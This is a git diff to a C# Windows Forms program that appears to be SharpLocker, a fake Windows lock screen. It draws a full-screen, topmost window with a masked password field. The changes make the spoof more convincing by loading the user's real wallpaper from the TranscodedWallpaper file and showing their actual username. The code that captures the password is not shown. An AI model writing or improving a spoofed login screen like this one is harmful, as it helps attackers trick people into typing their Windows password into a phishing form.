@@ -10,6 +10,8 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Linq;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
+using System.IO;
 
 namespace WindowsFormsApp9
 {
@@ -24,7 +26,11 @@ namespace WindowsFormsApp9
             StartPosition = FormStartPosition.Manual;
             Location = new Point(0, 0);
             Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Image myimage = new Bitmap(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
+
+            //Creds to keldnorman
+            //https://github.com/Pickfordmatt/SharpLocker/issues/2
+            Image myimage = new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
+            
             BackgroundImage = myimage;
             BackgroundImageLayout = ImageLayout.Stretch;
             this.TopMost = true;
@@ -44,6 +50,11 @@ namespace WindowsFormsApp9
             label1.Top = locked;
             textBox2.UseSystemPasswordChar = true;
 
+            //Get the username. This returns Domain\Username
+            string userNameText = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+
+            //Set the text
+            label2.Text = userNameText.Split('\\')[1];
 
             foreach (var screen in Screen.AllScreens)
             {
